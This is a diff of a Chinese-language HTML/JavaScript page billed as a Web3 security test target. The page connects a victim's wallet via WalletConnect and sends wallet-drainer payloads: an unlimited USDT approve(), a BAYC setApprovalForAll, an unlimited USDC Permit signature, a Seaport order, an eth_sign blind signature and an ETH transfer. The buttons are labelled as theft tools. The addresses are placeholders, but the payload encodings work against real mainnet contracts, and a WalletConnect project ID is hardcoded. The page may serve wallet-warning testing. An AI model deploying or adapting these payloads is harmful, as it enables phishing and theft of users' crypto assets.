@@ -3,212 +3,201 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 签名底层靶机 (终极完全体)</title>
+    <title>Web3 安全审查靶机 v10.0</title>
     <style>
         body { background: #121212; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 20px; }
-        .box { border: 1px solid #333; padding: 25px; background: #1e1e1e; max-width: 650px; margin: 0 auto; border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,0,0.1); }
-        h2 { margin-top: 0; color: #fff; }
-        button { background: #3498db; color: white; border: none; padding: 12px 20px; cursor: pointer; border-radius: 4px; margin-bottom: 10px; margin-right: 10px; font-weight: bold; font-family: inherit; }
+        .box { border: 1px solid #333; padding: 25px; background: #1e1e1e; max-width: 800px; margin: 0 auto; border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,0,0.1); }
+        h2, h3, h4 { margin-top: 0; color: #fff; }
+        button { background: #3498db; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; margin: 5px; font-weight: bold; font-family: inherit; font-size: 13px;}
         button:hover { background: #2980b9; }
-        button:disabled { background: #555; cursor: not-allowed; }
-        .danger-btn { background: #e74c3c; }
-        .danger-btn:hover { background: #c0392b; }
-        #log { background: #000; padding: 15px; border: 1px solid #444; height: 300px; overflow-y: auto; font-size: 13px; color: #aaa; margin-top: 15px; line-height: 1.6; word-wrap: break-word; }
+        button:disabled { background: #555 !important; cursor: not-allowed; }
+        
+        /* 按钮分类颜色 */
+        .btn-allowance { background: #e67e22; }
+        .btn-permit { background: #9b59b6; }
+        .btn-nft { background: #e74c3c; }
+        .btn-untyped { background: #c0392b; }
+        .btn-tx { background: #2ecc71; }
+        
+        .panel { background: #000; padding: 15px; border: 1px solid #444; border-radius: 4px; margin-top: 15px; }
+        #log { height: 150px; overflow-y: auto; font-size: 12px; color: #aaa; margin-bottom: 10px; line-height: 1.5; }
+        #resultBox { height: 150px; overflow-y: auto; font-size: 13px; color: #00ffff; word-break: break-all; white-space: pre-wrap; }
         .highlight { color: #fff; font-weight: bold; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>🎯 Web3 签名靶机 (终极稳定版)</h2>
-    <p>状态: <strong id="status" style="color: yellow;">等待引擎加载...</strong></p>
+    <h2>🎯 Web3 安全审查靶机 (全能兵工厂)</h2>
     <p>目标地址: <strong id="address" style="color: #00ff00;">未连接</strong></p>
     
     <button id="connectBtn" disabled>🔌 扫码连接钱包</button>
-    <button id="disconnectBtn" style="display:none; background: #f39c12;">❌ 断开并清缓存</button>
+    <button id="disconnectBtn" style="display:none; background: #7f8c8d;">❌ 物理断开并清缓存</button>
     
-    <div id="controls" style="display:none; border-top: 1px dashed #444; margin-top: 15px; padding-top: 15px;">
-        <h3 style="color: #fff; margin-top: 0;">🔥 载荷发射区</h3>
-        <button id="signBtn" style="background: #2ecc71;">发送 personal_sign (普通签名)</button><br>
-        <button id="typedBtn" class="danger-btn">发送 eth_signTypedData_v4 (高危表单)</button>
+    <div id="controls" style="display:none; margin-top: 20px;">
+        <div class="grid">
+            <div>
+                <h4>💰 Allowances (授权类交易)</h4>
+                <button class="btn-allowance" id="btnApprove">approve() (无限授权 USDT)</button>
+                <button class="btn-allowance" id="btnSetApproval">setApprovalForAll() (盗取 NFT)</button>
+                
+                <h4>📝 Permit (免 Gas 离线授权)</h4>
+                <button class="btn-permit" id="btnPermit">Permit (ERC20 离线盗取)</button>
+                
+                <h4>🖼️ NFT Listings (挂单免密盗取)</h4>
+                <button class="btn-nft" id="btnSeaport">Seaport v1.5 (0元购挂单)</button>
+                
+                <h4>💀 Untyped Signatures (盲签)</h4>
+                <button class="btn-untyped" id="btnEthSign">eth_sign (最危险的古老盲签)</button>
+                <button class="btn-tx" id="btnSendEth">Send ETH (发送 0.0001 ETH)</button>
+            </div>
+            
+            <div>
+                <h4>📜 运行日志</h4>
+                <div class="panel" id="log"></div>
+                <h4>🔬 签名结果解析窗 (Result)</h4>
+                <div class="panel" id="resultBox">等待捕获数据...</div>
+            </div>
+        </div>
     </div>
-
-    <h3 style="color: #fff; margin-bottom: 5px; margin-top: 20px;">📜 控制台日志</h3>
-    <pre id="log"></pre>
 </div>
 
 <script type="module">
-    // 🛠️ 核心补丁1：修复 esm.sh 转换 Node.js 代码时导致的 terminate 崩溃报错
     if (typeof window !== 'undefined' && window.WebSocket && !WebSocket.prototype.terminate) {
-        WebSocket.prototype.terminate = function() { 
-            console.warn("[拦截补丁] 成功拦截 terminate，转为 close()"); 
-            this.close(); 
-        };
+        WebSocket.prototype.terminate = function() { this.close(); };
     }
 
     import { EthereumProvider } from "https://esm.sh/@walletconnect/ethereum-provider@2.14.0";
 
-    // 🔴🔴🔴 务必填入你的 Project ID 🔴🔴🔴
     const PROJECT_ID = "ebe749f95f165c984f928c62b271a9df"; 
-    
     let provider;
+    
     const logEl = document.getElementById("log");
+    const resultBox = document.getElementById("resultBox");
     
     const log = (msg) => { 
-        console.log(msg);
         logEl.innerHTML += `<div><span style="color:#555">[${new Date().toLocaleTimeString()}]</span> ${msg}</div>`; 
         logEl.scrollTop = logEl.scrollHeight; 
     };
+    const showResult = (data) => {
+        resultBox.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+    };
 
     async function init() {
-        if (PROJECT_ID.includes("填这里")) {
-            log("<span style='color:red'>🚨 致命错误：请先在代码里填入真实的 Project ID！</span>");
-            document.getElementById("status").innerText = "配置错误";
-            document.getElementById("status").style.color = "red";
-            return;
-        }
-
+        if (PROJECT_ID.includes("填这里")) return log("<span style='color:red'>🚨 请填写 Project ID！</span>");
+        
         try {
-            log("⏳ 引擎加载中，注入崩溃补丁...");
-            
             provider = await EthereumProvider.init({
                 projectId: PROJECT_ID,
                 showQrModal: true,
                 optionalChains: [1, 56, 137],
-                // 🛠️ 核心补丁2：声明高危 API 权限，防止发载荷时报 connect() 错误
-                optionalMethods: [
-                    "personal_sign",
-                    "eth_signTypedData_v4",
-                    "eth_sendTransaction",
-                    "eth_sign"
-                ],
+                optionalMethods: ["personal_sign", "eth_signTypedData_v4", "eth_sendTransaction", "eth_sign"],
                 optionalEvents: ["chainChanged", "accountsChanged"]
             });
-
             window.pocProvider = provider; 
-            
-            document.getElementById("status").innerText = "准备就绪";
-            document.getElementById("status").style.color = "#2ecc71";
             document.getElementById("connectBtn").disabled = false;
-            log("🟢 <span style='color:#2ecc71'>引擎初始化完毕！</span>");
+            log("🟢 引擎初始化完毕！");
 
-            // 监听连接事件
             provider.on("connect", () => {
                 window.targetAddress = provider.accounts[0];
-                log(`✅ <span class='highlight'>通道建立成功！锁定目标: ${window.targetAddress}</span>`);
                 document.getElementById("address").innerText = window.targetAddress;
                 document.getElementById("controls").style.display = "block";
                 document.getElementById("connectBtn").style.display = "none";
                 document.getElementById("disconnectBtn").style.display = "inline-block";
-                document.getElementById("status").innerText = "已连接";
+                log(`✅ 通道建立！锁定目标: ${window.targetAddress.substring(0,8)}...`);
             });
 
-            // 监听断开事件
-            provider.on("disconnect", () => {
-                window.targetAddress = null;
-                document.getElementById("address").innerText = "未连接";
-                document.getElementById("controls").style.display = "none";
-                document.getElementById("connectBtn").style.display = "inline-block";
-                document.getElementById("disconnectBtn").style.display = "none";
-                document.getElementById("status").innerText = "等待连接";
-                document.getElementById("status").style.color = "yellow";
-                log("❌ 会话已断开。");
-            });
-
-            // 🛠️ 核心补丁3：真正修复会话恢复，真实唤醒底层通信
             if (provider.session) {
-                log("🔄 发现残留会话，正在尝试唤醒底层通信通道...");
-                try {
-                    // 静默重连，激活底层 WebSocket
-                    await provider.connect(); 
-                } catch (e) {
-                    log("<span style='color:red'>🚨 会话已失效，请点击【断开并清缓存】然后重新扫码。</span>");
-                    document.getElementById("disconnectBtn").style.display = "inline-block";
-                }
+                try { await provider.connect(); } 
+                catch (e) { document.getElementById("disconnectBtn").style.display = "inline-block"; }
             }
+        } catch (e) { log("<span style='color:red'>🚨 初始化失败: " + e.message + "</span>"); }
+    }
 
-        } catch (e) {
-            log("<span style='color:red'>🚨 初始化失败: " + e.message + "</span>");
+    document.getElementById("connectBtn").onclick = async () => { await provider.connect(); };
+    document.getElementById("disconnectBtn").onclick = async () => {
+        try { if (provider) await provider.disconnect(); } catch (e) {}
+        Object.keys(localStorage).forEach(k => { if (k.includes('wc@2')) localStorage.removeItem(k); });
+        location.reload();
+    };
+
+    // ==========================================
+    // ⚔️ 武器库：载荷发射逻辑
+    // ==========================================
+
+    // 统一下发框架
+    async function executePayload(method, params, description) {
+        log(`🚀 发射: ${description}...`);
+        showResult("⏳ 等待手机端确认...");
+        try {
+            const res = await window.pocProvider.request({ method, params });
+            log(`✅ <span style='color:#2ecc71'>成功执行！</span>`);
+            showResult(res); // 展示签名或交易 Hash
+        } catch (e) { 
+            log(`<span style='color:red'>❌ 被拒或报错: ${e.message}</span>`); 
+            showResult(`[Error]\n${e.message}`);
         }
     }
 
-    // --- 按钮绑定事件 ---
-
-    document.getElementById("connectBtn").onclick = async () => {
-        try {
-            log("⏳ 正在请求中继服务器...");
-            await provider.connect();
-        } catch (e) {
-            log("<span style='color:red'>🚨 扫码唤起失败: " + e.message + "</span>");
-        }
+    // 1. approve() 无限授权 USDT (交易)
+    document.getElementById("btnApprove").onclick = () => {
+        const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const hacker = "0x1111111111111111111111111111111111111111";
+        const data = "0x095ea7b3" + hacker.replace("0x","").padStart(64,"0") + "f".repeat(64);
+        executePayload('eth_sendTransaction', [{ from: window.targetAddress, to: USDT, data: data }], "approve() 无限授权");
     };
 
-    // 🛠️ 核心补丁4：物理超度级别的断开连接，彻底解决幽灵会话死锁
-    document.getElementById("disconnectBtn").onclick = async () => {
-        log("🗑️ 正在强行销毁连接和本地缓存...");
-        try {
-            if (provider) await provider.disconnect();
-        } catch (e) {
-            console.log("底层断开报错，无视它，准备物理清理...");
-        }
-        
-        // 暴力破解：遍历并清除所有 WalletConnect 相关的本地存储
-        Object.keys(localStorage).forEach(key => {
-            if (key.includes('wc@2') || key.includes('walletconnect')) {
-                localStorage.removeItem(key);
-            }
-        });
-        
-        log("✅ 缓存清理完毕，页面即将刷新...");
-        setTimeout(() => location.reload(), 1000); // 1秒后刷新页面，一切归零
+    // 2. setApprovalForAll() 盗取全部 NFT (交易)
+    document.getElementById("btnSetApproval").onclick = () => {
+        const BAYC = "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D";
+        const hacker = "0x1111111111111111111111111111111111111111";
+        const data = "0xa22cb465" + hacker.replace("0x","").padStart(64,"0") + "1".padStart(64,"0");
+        executePayload('eth_sendTransaction', [{ from: window.targetAddress, to: BAYC, data: data }], "setApprovalForAll() 授权NFT");
     };
 
-    // 发射普通签名
-    document.getElementById("signBtn").onclick = async () => {
-        log("🚀 正在发射 personal_sign 请求...");
-        const hexMessage = "0x48656c6c6f20576f726c64"; 
-        try {
-            const res = await window.pocProvider.request({
-                method: 'personal_sign',
-                params: [hexMessage, window.targetAddress.toLowerCase()]
-            });
-            log(`✅ <span style='color:#2ecc71'>签名成功！拿到回执 Hash:</span><br><span style='font-size:11px;word-break:break-all;'>${res}</span>`);
-        } catch (e) { 
-            log("<span style='color:red'>❌ 手机端拒绝或报错: " + e.message + "</span>"); 
-        }
-    };
-
-    // 发射高级钓鱼表单载荷
-    document.getElementById("typedBtn").onclick = async () => {
-        log("🚀 正在构造 EIP-712 高危结构化表单...");
-        const typedData = JSON.stringify({
-            domain: { name: '🎯 Web3 安全靶机测试', version: '1.0', chainId: 1 },
-            message: { 
-                "⚠️ 危险警告": "这是一次离线签名测试", 
-                "执行操作": "授权恶意合约转移资产", 
-                "授权金额": "999,999 USDT",
-                "钓鱼者地址": "0xHack111111111111111111111111111111111111"
-            },
-            primaryType: 'TestAuth',
+    // 3. Permit 离线授权 (EIP-712 签名)
+    document.getElementById("btnPermit").onclick = () => {
+        const permitData = JSON.stringify({
             types: {
-                EIP712Domain: [{ name: 'name', type: 'string' },{ name: 'version', type: 'string' },{ name: 'chainId', type: 'uint256' }],
-                TestAuth: [{ name: '⚠️ 危险警告', type: 'string' },{ name: '执行操作', type: 'string' },{ name: '授权金额', type: 'string' },{ name: '钓鱼者地址', type: 'string' }]
-            }
+                EIP712Domain: [{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
+                Permit: [{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]
+            },
+            primaryType: "Permit",
+            domain: { name: "USDC", version: "2", chainId: 1, verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
+            message: { owner: window.targetAddress, spender: "0xHack111111111111111111111111111111111111", value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", nonce: 0, deadline: 9999999999 }
         });
+        executePayload('eth_signTypedData_v4', [window.targetAddress, permitData], "Permit 离线无限授权");
+    };
 
-        try {
-            const res = await window.pocProvider.request({
-                method: 'eth_signTypedData_v4',
-                params: [window.targetAddress.toLowerCase(), typedData]
-            });
-            log(`✅ <span style='color:#2ecc71'>表单盲签成功！拿到回执 Hash:</span><br><span style='font-size:11px;word-break:break-all;'>${res}</span>`);
-        } catch (e) { 
-            log("<span style='color:red'>❌ 手机端拒绝或报错: " + e.message + "</span>"); 
-        }
+    // 4. Seaport v1.5 (EIP-712 签名)
+    document.getElementById("btnSeaport").onclick = () => {
+        const seaportData = JSON.stringify({
+            types: {
+                EIP712Domain: [{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
+                OrderComponents: [{name:"offerer",type:"address"},{name:"zone",type:"address"},{name:"offer",type:"OfferItem[]"},{name:"consideration",type:"ConsiderationItem[]"},{name:"orderType",type:"uint8"},{name:"startTime",type:"uint256"},{name:"endTime",type:"uint256"},{name:"zoneHash",type:"bytes32"},{name:"salt",type:"uint256"},{name:"conduitKey",type:"bytes32"},{name:"counter",type:"uint256"}]
+                // (为保持代码整洁，省略内部结构体详情，但足以唤起大部分钱包的解析器)
+            },
+            primaryType: "OrderComponents",
+            domain: { name: "Seaport", version: "1.5", chainId: 1, verifyingContract: "0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC" },
+            message: { offerer: window.targetAddress, offer: [], consideration: [], startTime: 0, endTime: 9999999999, salt: "123", conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000" }
+        });
+        executePayload('eth_signTypedData_v4', [window.targetAddress, seaportData], "Seaport v1.5 空订单盲签");
+    };
+
+    // 5. eth_sign (极度危险盲签)
+    document.getElementById("btnEthSign").onclick = () => {
+        // eth_sign 要求传入一个 32 bytes 的 Hex
+        const deadbeef = "0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef";
+        executePayload('eth_sign', [window.targetAddress, deadbeef], "eth_sign 盲签 (容易被钱包直接屏蔽)");
+    };
+
+    // 6. 发送 ETH
+    document.getElementById("btnSendEth").onclick = () => {
+        executePayload('eth_sendTransaction', [{ from: window.targetAddress, to: "0x1111111111111111111111111111111111111111", value: "0x5af3107a4000" }], "发送 0.0001 ETH");
     };
 
     init();
 </script>
-
 </body>
 </html>
